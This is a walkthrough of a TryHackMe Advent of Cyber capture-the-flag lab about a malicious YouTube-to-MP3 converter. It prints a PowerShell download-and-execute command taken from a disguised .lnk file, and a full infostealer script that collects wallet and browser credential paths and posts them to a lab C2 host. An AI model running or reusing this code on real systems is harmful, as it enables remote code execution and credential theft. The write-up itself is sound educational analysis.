# Advent of Cyber Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?
This task was dealing with OPSEC (Operational Security). You, as an investigator, have decided to dig into the YouTube-to-MP3 converter other SOC-mas organizers have been sharing.

## Why are we investigating the converter?
They can be used to deliver malicious software and be used for phishing credentials or other sensitive information. 

## Where to start?
1. Start the machine that was created for this challenge.
2. Navigate to the IP address generated if you are on the attack box. It will take you to the converter.
3. Using the link provided in the challenge https[:]//www[.]youtube[.]com/watch?v=dQw4w9WgXcQ which I have defanged is the YouTube video that have been suggested to use.
4. Choose either file extensions (it honestly doesn't matter which) and download the file and extract it.

## What to do next?
Navigate to where the file downloaded and run the `file` command like this `file song.{mp3|mp4}` This command out puts information on what the file "looks" like to the system. 

This is the "normal" file. As you can see it shows that it is in fact an `Audio file with ID3 version 2.3.0`.
![file_cmd_thm_aoc_d1](https://github.com/user-attachments/assets/17505b04-792a-4611-9115-489ce8b17ad4 "file command output from the THM AoC DayOne")

However, when you run the same `file` command on the other super sneaky downloaded "mp3" using `file somg.{mp3|mp4}` you get this:

![file_somg_thm_aoc_d1](https://github.com/user-attachments/assets/a3a1ef38-6c3a-4bbc-8d67-984f199c3b08 "file command output from the bad file")

You can see that the file is not a media file but a `MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments` aka `.lnk` file. This is malicious. 

### Let's inspect this malicious file (Question 1 can be answered by something in this output)

If you are using the TryHackMe machines, all the tools needed are alreay installed. If not, you'll want to install `exiftool` using your operating systems preferred install method.

Using the command `exiftool somg.{mp3|mp4}` you get this out put in your terminal:
```
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```
Those are PowerShell (PS) commands. What they do are:
1. The `-ep Bypass -nop` flag disables the usual restrictions PS has and allows scripts (instructions in code) to run without interference.
2. The `DownloadFile` method downloads a file (a `IS.ps1` file) from the remote server `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1` and saves it in the `C:\\ProgramData\\ directory.
3. As soon as it is downloaded, the script gets executed in PowerShell using the `iex` command and triggers the downloaded `s.ps1` file.

**If you want you can look at the file, please don't use a windows device to do this as it will run and execute. Please don't bork your device.**

The file looks like this:
```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

If you look through the file contents, theres something that is really interesting. It seems as though this file is ET and is phoning home to a C2 (command and control) server. The url answers question 2.

## Where did this come from and where does it go??
In the file you can see `Created by the one and only M.M.`, but who is that? You can search for that string on GitHub (GH) by using this url `https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues`. If you get an error about rate limiting, you can either log in using your own GH account or try later. You can infer who M.M. is by the information on the comment that comes up (this answers question 3) and you can see how many times this repo has been committed to (this answers question 4). 

## Let's wrap this day up
Once you answer questions 1-4, the other two question are a given. If you want to, you can checkout the [OPSEC](https://tryhackme.com/r/room/opsec) room to learn more about it. 

# CONGRATULATIONS!!!!
You have finished Day 1 of TryHackMe's Advent of Cyber!!! 🎉🎉🎉🎉🎉🎉🎉🎉🎉


